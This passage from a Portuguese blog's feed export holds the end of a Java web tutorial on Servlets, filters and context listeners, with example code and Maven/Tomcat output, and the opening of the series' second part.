&lt;p&gt;Executando o &lt;em&gt;Maven&lt;/em&gt; (&lt;code&gt;mvn clean tomcat7:run&lt;/code&gt;), e através do endereço &lt;code&gt;http://localhost:8080&lt;/code&gt;, somos capazes de ver o resultado:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/java-post-browser.png" width="400" height="300" title="Exemplo de POST" alt="Exemplo de POST"&gt;&lt;/p&gt;
&lt;p&gt;Ao analisar o código acima, além das possibilidades de melhoria de código (como reaproveitar o
&lt;code&gt;req.getRequestDispatcher("/WEB-INF/index.jsp")&lt;/code&gt; ao invés de duplicá-lo, ou fazer um &lt;code&gt;redirect&lt;/code&gt;),
há algo muito importante que precisa ser salientado: &lt;em&gt;Servlets&lt;/em&gt; não são "thread safe".&lt;/p&gt;
&lt;h2&gt;Don't repeat yourself&lt;/h2&gt;
&lt;p&gt;Segundo o &lt;a href="https://www.caelum.com.br/apostila-java-web/servlets/#uma-nica-instncia-de-cada-servlet" title="Leia mais na apostila da Caelum"&gt;material da &lt;em&gt;Caelum&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;De acordo com a especificação de Servlets, por padrão, existe uma única instância de cada Servlet declarada. Ao chegar
uma requisição para a Servlet, uma nova Thread é aberta sobre aquela instância que já existe.&lt;/p&gt;
&lt;p&gt;Isso significa que, se colocássemos em nossa Servlet uma variável de instância, ela seria compartilhada entre todas
as threads que acessam essa Servlet! Em outras palavras, seria compartilhado entre todas as requisições e todos os
clientes enxergariam o mesmo valor. Provavelmente não é o que queremos fazer.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Nosso protótipo está pronto, e a brincadeira com o atributo de instância nos permitiu interagir com o método &lt;code&gt;POST&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Se quisermos seguir em frente e tornar a aplicação mais "production ready", outros
aspectos terão que ser considerados, como persistência, segurança, validação de dados, modularidade, e não podemos esquecer
desses detalhes como a natureza &lt;em&gt;multithreading&lt;/em&gt; que envolve o &lt;em&gt;Java&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/dodge-this.png" width="740" height="415" title="Fazer algo funcionar na plataforma JavaEE parece como a Trinity acertando um agente em Matrix (vulturehound.co.uk)" alt="Fazer algo funcionar na plataforma JavaEE parece como a Trinity acertando um agente em Matrix (vulturehound.co.uk)"&gt;&lt;/p&gt;
&lt;p&gt;E se nesse momento você ainda está disposto a fazer isso "all by yourself", reconsidere. Para fins de aprendizado,
esse tipo de experimento é ótimo mas nada produtivo, portanto, considere o uso de algum &lt;em&gt;framework&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Para finalizar: Filters &amp;amp; Listeners&lt;/h2&gt;
&lt;p&gt;Mas calma! Há dois tópicos que valem a pena ser compreendidos antes de pular para o uso de algum &lt;em&gt;framework&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Diretamente de uma &lt;a href="https://stackoverflow.com/questions/4720942/difference-between-filter-and-listener-in-servlet-java-ee" title="Difference between Filter and Listener"&gt;&lt;em&gt;thread&lt;/em&gt; do &lt;em&gt;StackOverflow&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Servlet Filter is used for monitoring request and response from client to the servlet, or to modify the request and
response, or to audit and log.&lt;/p&gt;
&lt;p&gt;Servlet Listener is used for listening to events in a web containers, such as when you create a session, or place an
attribute in an session or if you passivate and activate in another container, to subscribe to these events you can
configure listener in web.xml, for example HttpSessionListener.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Em outras palavras:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Filtros:&lt;/strong&gt; Usados para interagir com a requisição e com a resposta.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Listeners:&lt;/strong&gt; Usados para interagir com eventos que acontecem dentro de um &lt;em&gt;container&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Filters&lt;/h3&gt;
&lt;p&gt;Assim como a interface &lt;code&gt;Servlet&lt;/code&gt;, possuímos uma interface para a escrita de filtros. O propósito do filtro abaixo é
"logar" o endereço &lt;em&gt;IP&lt;/em&gt; do usuário que está realizando a requisição:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// src/main/java/webapp/LogFilter.java&lt;/span&gt;
&lt;span class="kn"&gt;package&lt;/span&gt; &lt;span class="nn"&gt;webapp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.io.IOException&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.Date&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.Filter&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.FilterChain&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.FilterConfig&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.ServletException&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.ServletRequest&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.ServletResponse&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.annotation.WebFilter&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="nd"&gt;@WebFilter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/*&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;LogFilter&lt;/span&gt; &lt;span class="kd"&gt;implements&lt;/span&gt; &lt;span class="n"&gt;Filter&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="nd"&gt;@Override&lt;/span&gt;
    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;init&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;FilterConfig&lt;/span&gt; &lt;span class="n"&gt;filterConfig&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;ServletException&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;// vazio&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="nd"&gt;@Override&lt;/span&gt;
    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;doFilter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ServletRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ServletResponse&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;FilterChain&lt;/span&gt; &lt;span class="n"&gt;chain&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;IOException&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
            &lt;span class="n"&gt;ServletException&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;ipAddress&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRemoteAddr&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
        &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;now&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;

        &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;println&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;format&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;IP: %s; Time: %s&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ipAddress&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;

        &lt;span class="n"&gt;chain&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;doFilter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Com o uso da &lt;em&gt;annotation&lt;/em&gt; &lt;code&gt;WebFilter&lt;/code&gt;, dizemos que queremos aplicar o filtro para todas as requisições (&lt;code&gt;/*&lt;/code&gt;). A &lt;em&gt;annotation&lt;/em&gt; também é responsável por não precisarmos tocar no arquivo &lt;code&gt;web.xml&lt;/code&gt;, e temos o filtro funcionando a partir do momento que reiniciamos o &lt;em&gt;Tomcat&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Com &lt;code&gt;Filter&lt;/code&gt; agora temos a capacidade de aplicar de uma maneira mais modular conceitos como &lt;a href="https://klauslaube.com.br/2012/05/14/o-cache-e-o-http.html" title="O cache e o HTTP"&gt;&lt;em&gt;cache&lt;/em&gt;&lt;/a&gt;, compactação da
resposta, controle de sessão, &lt;a href="https://klauslaube.com.br/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html" title="Problemas comuns em aplicações web"&gt;segurança&lt;/a&gt;, entre outros.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.caelum.com.br/apostila-java-web/recursos-importantes-filtros/" title="Recursos importantes: Filtros"&gt;Leia mais sobre filtros na apostila de desenvolvimento &lt;em&gt;web&lt;/em&gt; em &lt;em&gt;Java&lt;/em&gt;, da &lt;em&gt;Caelum&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Listeners&lt;/h3&gt;
&lt;p&gt;A necessidade de filtros fica bem evidente, principalmente quando estamos acostumados com &lt;a href="https://www.profissionaisti.com.br/2009/04/entendendo-o-django/" title="Entendendo o Django"&gt;estruturas como a do &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.
Possivelmente a necessidade dos &lt;em&gt;listeners&lt;/em&gt; exija um pouco mais de criatividade de nossa parte. O &lt;a href="https://www.javatpoint.com/ServletContextEvent" title="ServletContextEvent and ServletContextListener"&gt;&lt;em&gt;JavaTPoint&lt;/em&gt; pode ajudar&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you want to perform some action at the time of deploying the web application such as creating database connection,
creating all the tables of the project etc, you need to implement ServletContextListener interface and provide the
implementation of its methods.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Perfeito! Para ilustrar como interagir com os (&lt;em&gt;context&lt;/em&gt;) &lt;em&gt;listeners&lt;/em&gt;, temos o código abaixo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// src/main/java/webapp/MyListener.java&lt;/span&gt;
&lt;span class="kn"&gt;package&lt;/span&gt; &lt;span class="nn"&gt;webapp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.ServletContextEvent&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.ServletContextListener&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.annotation.WebListener&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="nd"&gt;@WebListener&lt;/span&gt;
&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MyListener&lt;/span&gt; &lt;span class="kd"&gt;implements&lt;/span&gt; &lt;span class="n"&gt;ServletContextListener&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="nd"&gt;@Override&lt;/span&gt;
    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;contextInitialized&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ServletContextEvent&lt;/span&gt; &lt;span class="n"&gt;sce&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;println&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Imagine que estamos setando um pool de conexões com o banco de dados&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="nd"&gt;@Override&lt;/span&gt;
    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;contextDestroyed&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ServletContextEvent&lt;/span&gt; &lt;span class="n"&gt;sce&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;println&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Imagine que estamos fechando o pool de conexões com o banco de dados&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ao iniciar a aplicação, temos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ mvn tomcat7:run
[INFO] Scanning for projects...
(...)
INFO: Starting Servlet Engine: Apache Tomcat/7.0.47
Imagine que estamos setando um pool de conexões com o banco de dados
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E quando finalizamos a aplicação:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Imagine que estamos fechando o pool de conexões com o banco de dados
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E além de fechar o &lt;em&gt;pool&lt;/em&gt; de conexões, fechamos também a parte de &lt;em&gt;Servlets&lt;/em&gt; dessa série. Fica uma clara impressão de
que grande parte do que precisamos para desenvolver uma plataforma &lt;em&gt;web&lt;/em&gt; já é oferecida pela versão atual do
&lt;em&gt;Java Enterprise Edition&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.caelum.com.br/apostila-java-web/apendice-topicos-da-servlet-api/#context-listener" title="Context Listener"&gt;Leia mais sobre context listener na apostilia de desenvolvimento &lt;em&gt;web&lt;/em&gt; em &lt;em&gt;Java&lt;/em&gt;, da &lt;em&gt;Caelum&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Antes de ir: O lado "agente Smith" da força&lt;/h2&gt;
&lt;p&gt;E aqui chegamos ao fim dessa nossa saga cobrindo aspectos do &lt;em&gt;Java EE&lt;/em&gt;. Ainda que faltem tópicos considerados relevantes, como o
&lt;a href="https://docs.oracle.com/javaee/7/api/javax/ejb/package-summary.html" title="Enterprise JavaBeans"&gt;&lt;em&gt;EJB&lt;/em&gt;&lt;/a&gt;, &lt;a href="https://www.oracle.com/technetwork/java/javaee/javaserverfaces-139869.html" title="JavaServer Faces"&gt;&lt;em&gt;JSF&lt;/em&gt;&lt;/a&gt;
ou &lt;a href="https://www.oracle.com/technetwork/java/javaee/tech/persistence-jsp-140049.html" title="Java Persistence API"&gt;&lt;em&gt;JPA&lt;/em&gt;&lt;/a&gt;,
cobrimos outros tantos que fazem parte da especificação.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/agent-smith.jpeg" width="740" height="370" title="Seja a resistência! Lute contra os engravatados (antagonist.wikia.com)" alt="Seja a resistência! Lute contra os engravatados (antagonist.wikia.com)"&gt;&lt;/p&gt;
&lt;p&gt;Especificação essa que, além de ter como proposta proporcionar tecnologias para um ambiente mais &lt;em&gt;enterprise&lt;/em&gt;, possui outras vantagens,
como por exemplo, a premissa de evitar o &lt;em&gt;vendor lock-in&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Mas ao contrário do que você possa pensar, e do que eu acreditava até pouco tempo atrás, não seguir essas especificações é uma possibilidade.
De fato, algumas comunidades vem desafiando essas "regras" e apresentando soluções elegantes e inovadoras dentro do ecossistema &lt;em&gt;Java&lt;/em&gt; desde
muito tempo. &lt;a href="https://docs.spring.io/spring/docs/current/spring-framework-reference/overview.html#overview-history" title="History of Spring and the Spring Framework"&gt;Talvez a mais relevante delas sendo a do &lt;em&gt;Spring&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Spring came into being in 2003 as a response to the complexity of the early J2EE specifications. While some consider
Java EE and Spring to be in competition, Spring is, in fact, complementary to Java EE. The Spring programming model
does not embrace the Java EE platform specification; rather, it integrates with carefully selected individual
specifications from the EE umbrella.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Inclusive, em um mundo cada vez mais "microservices-driven", seguir completamente essas especificações torna-se questionável,
como ilustra &lt;em&gt;Rod Johnson&lt;/em&gt; em sua palestra &lt;a href="https://www.infoq.com/presentations/principles-successful-frameworks/" title="Assista no InfoQ"&gt;&lt;em&gt;Eighteen Years of Spring&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;E é com o &lt;em&gt;Spring&lt;/em&gt; que no próximo artigo experimentaremos esse lado "rebelde" e, sem dúvida, mais divertido, do desenvolvimento &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; com &lt;em&gt;Java&lt;/em&gt;.
Mas se você quiser continuar em um ambiente mais &lt;em&gt;enterprise&lt;/em&gt;: &lt;a href="https://en.wikipedia.org/wiki/GlassFish" title="Open-source application server"&gt;&lt;em&gt;Glassfish&lt;/em&gt;&lt;/a&gt;, &lt;a href="https://en.wikipedia.org/wiki/WildFly" title="Antigo JBoss"&gt;&lt;em&gt;WildFly&lt;/em&gt;&lt;/a&gt;
e &lt;a href="https://en.wikipedia.org/wiki/Apache_Geronimo" title="Application server fornecido pela Apache Foundation"&gt;&lt;em&gt;Geronimo&lt;/em&gt;&lt;/a&gt;; podem ser os próximos passos.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;E mais uma vez, embora possa ser tentador cair na discussão "Spring x Java EE", &lt;em&gt;Siva Prasad&lt;/em&gt;
deixa essa pérola no artigo &lt;a href="https://dzone.com/articles/developers-perspective-spring" title="Leia o artigo na íntegra"&gt;"A developer's perspective on Spring vs. Java EE"&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;As an enthusiastic Java developer I read the Spring vs JavaEE discussions hoping there might be few things which I
don't know such as "in which areas one is better than the other". But I find 70% of discussions goes on lame
arguments which is not very interesting to me.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ter uma noção de como funciona a plataforma &lt;em&gt;EE&lt;/em&gt; do &lt;em&gt;Java&lt;/em&gt; é benéfico, embora eu admita que não seja lá muito divertido.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.caelum.com.br/apostila-java-web/servlets/"&gt;Caelum: Apostila Java para Desenvolvimento Web - Servlets&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.concretepage.com/java-ee/jsp-servlet/weblistener-annotation-example-in-servlet-3-with-servletcontextlistener"&gt;ConcretePage: @WebListener Annotation Example in Servlet 3 with ServletContextListener&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.dineshonjava.com/what-is-dispatcherservlet-in-spring-and-its-uses/"&gt;Dinesh on Java: What is the DispatcherServlet in Spring and its uses?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dzone.com/articles/developers-perspective-spring"&gt;DZone: A Developer's Perspective on Spring vs. JavaEE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.infoq.com/presentations/principles-successful-frameworks/"&gt;InfoQ: Eighteen Years of Spring&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.javatpoint.com/ServletContextEvent"&gt;JavaTPoint: ServletContextEvent and ServletContextListener&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.spring.io/spring/docs/current/spring-framework-reference/overview.html#overview-history"&gt;Spring: Spring Framework Overview&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/4720942/difference-between-filter-and-listener-in-servlet-java-ee"&gt;StackOverflow: Difference between Filter and Listener in Servlet (Java EE)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/15774924/just-what-is-java-ee-really"&gt;StackOverflow: Just what is Java EE really?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/9555842/why-servlets-are-not-thread-safe"&gt;StackOverflow: Why Servlets are not thread safe?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="java"></category><category term="servlet"></category></entry><entry><title>Engatinhando em Java para a web - Parte 2</title><link href="https://klauslaube.com.br/2019/12/02/engatinhando-em-java-web-parte-2.html" rel="alternate"></link><published>2019-12-02T09:15:00-03:00</published><updated>2019-12-02T09:15:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2019-12-02:/2019/12/02/engatinhando-em-java-web-parte-2.html</id><summary type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2019/11/28/engatinhando-em-java-web-parte-1.html" title="Engatinhando em Java para a web - Parte 1"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt; demos uma breve pincelada sobre &lt;em&gt;JDK&lt;/em&gt;, &lt;em&gt;JRE&lt;/em&gt;, &lt;em&gt;JSE&lt;/em&gt; e &lt;em&gt;JEE&lt;/em&gt;. Uma vez que temos a infrastrutura funcionando para os fins desse artigo, através do uso de &lt;em&gt;Maven&lt;/em&gt; e &lt;em&gt;Tomcat&lt;/em&gt;, vamos partir para uma abordagem mais prática, e finalmente falar sobre os famosos &lt;em&gt;Servlets&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Mas antes de continuar …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2019/11/28/engatinhando-em-java-web-parte-1.html" title="Engatinhando em Java para a web - Parte 1"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt; demos uma breve pincelada sobre &lt;em&gt;JDK&lt;/em&gt;, &lt;em&gt;JRE&lt;/em&gt;, &lt;em&gt;JSE&lt;/em&gt; e &lt;em&gt;JEE&lt;/em&gt;. Uma vez que temos a infrastrutura funcionando para os fins desse artigo, através do uso de &lt;em&gt;Maven&lt;/em&gt; e &lt;em&gt;Tomcat&lt;/em&gt;, vamos partir para uma abordagem mais prática, e finalmente falar sobre os famosos &lt;em&gt;Servlets&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Mas antes de continuar, um breve &lt;em&gt;disclaimer&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;Recebi alguns &lt;em&gt;feedbacks&lt;/em&gt; sobre o artigo anterior, questionando sobre a abordagem em relação a &lt;em&gt;Servlets&lt;/em&gt;, &lt;em&gt;JavaServer Pages&lt;/em&gt; e até mesmo ao &lt;em&gt;Tomcat&lt;/em&gt; e &lt;em&gt;Maven&lt;/em&gt;. Existem escolhas mais "sexy" (principalmente aos três últimos citados), e que em relação ao &lt;em&gt;Servlets&lt;/em&gt; a escolha mais natural seria a adoção de algum &lt;em&gt;framework&lt;/em&gt; que abstraia todo esse "javanês" (como &lt;a href="https://spring.io/projects/spring-boot" title="Página oficial do Spring Boot"&gt;&lt;em&gt;SpringBoot&lt;/em&gt;&lt;/a&gt; ou &lt;a href="https://www.playframework.com/" title="Página oficial do projeto Play"&gt;&lt;em&gt;Play&lt;/em&gt;&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/java-saruman.jpeg" width="740" height="435" title="Continuamos a trair a movimento assim como o Saruman fez em LOTR (sott.net)" alt="Continuamos a trair a movimento assim como o Saruman fez em LOTR (sott.net)"&gt;&lt;/p&gt;
&lt;p&gt;A narrativa dessa série de artigos tem justamente a intenção de ilustrar que em um primeiro momento, &lt;a href="https://klauslaube.com.br/tag/java.html" title="Leia mais sobre Java"&gt;&lt;em&gt;Java&lt;/em&gt;&lt;/a&gt; para &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; pode parecer obsoleto, mas que com o progredir dos &lt;em&gt;posts&lt;/em&gt; novas tecnologias serão apresentadas e que por fim, é possível sim ter um ambiente deveras moderno e prático.&lt;/p&gt;
&lt;p&gt;Estamos "engatinhando", afinal...&lt;/p&gt;
&lt;p&gt;Obrigado pelos &lt;em&gt;feedbacks&lt;/em&gt; :)&lt;/p&gt;
&lt;h2&gt;Servlets&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Servlet&lt;/em&gt; pode ser comparado ao &lt;a href="https://klauslaube.com.br/2012/11/02/entendendo-o-cgi-fastcgi-e-wsgi.html" title="Entendendo o CGI"&gt;&lt;em&gt;Common Gateway Interface&lt;/em&gt;&lt;/a&gt; (&lt;em&gt;CGI&lt;/em&gt;), onde há um "acordo" o servidor &lt;em&gt;web&lt;/em&gt; ou de aplicação, e a sua aplicação. As definições podem vir das mais variadas formas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;É uma tecnologia usada para a criação de aplicações &lt;em&gt;web&lt;/em&gt; em &lt;em&gt;Java&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;É uma &lt;em&gt;API&lt;/em&gt; que disponibiliza classes, interfaces e documentação necessárias para tal operação.&lt;/li&gt;
&lt;li&gt;É uma classe que estende as capacidades de servidores e reage à requisições (de qualquer tipo).&lt;/li&gt;
&lt;li&gt;É um componente &lt;em&gt;web&lt;/em&gt; que cria páginas dinâmicas para a &lt;em&gt;web&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
